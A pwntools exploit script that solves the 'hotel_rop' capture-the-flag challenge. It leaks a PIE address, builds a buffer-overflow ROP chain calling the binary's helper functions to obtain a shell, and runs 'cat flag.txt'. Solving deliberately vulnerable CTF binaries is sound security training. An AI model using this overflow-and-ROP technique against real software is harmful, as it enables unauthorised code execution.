#!/usr/bin/env python3
import pwn

host = "dctf1-chall-hotel-rop.westeurope.azurecontainer.io"
port = 7480
target = "hotel_rop"


def exploit(remote):
    if remote:
        pr = pwn.connect(host, port)
    else:
        pr = pwn.process(target)

    try:
        elf = pwn.ELF(target)
        rop = pwn.ROP(elf)


        main_addr = pr.readline().strip().decode()
        main_addr = int(main_addr[main_addr.find('street ')+7:], 16)
        print('main @', hex(main_addr))

        ca_addr = main_addr + (elf.sym['california']-elf.sym['main'])
        si_addr = main_addr + (elf.sym['silicon_valley']-elf.sym['main'])
        loss_addr = main_addr + (elf.sym['loss']-elf.sym['main'])
        print('ca @', hex(ca_addr))
        print('si @', hex(si_addr))
        print('loss @', hex(loss_addr))

        """
        california() => win_land='/bin'
        silicon_valley() => win_land='/bin/sh'
        loss(0x1337c0de, 0xdeadc0de-0x1337c0de)
        """
        pop_rdi = pwn.p64(main_addr+(rop.find_gadget(['pop rdi', 'ret']).address-elf.sym['main']))
        pop_rsi = pwn.p64(main_addr+(rop.find_gadget(['pop rsi', 'pop r15', 'ret']).address-elf.sym['main']))

        payload = b'A'*40
        payload += pwn.p64(ca_addr)
        payload += pwn.p64(si_addr)
        payload += pop_rdi + pwn.p64(0x1337c0de)
        payload += pop_rsi + pwn.p64(0xcb760000) + pwn.p64(0xcb760000)
        payload += pwn.p64(loss_addr)

        print(len(payload), payload)
        pr.sendafter('often?\n', payload)
        pr.sendline()
        pr.sendline('cat flag.txt')
        print(pr.readall(4))

    except Exception as e:
        print(e)
    finally:
        pr.close()

exploit(False)
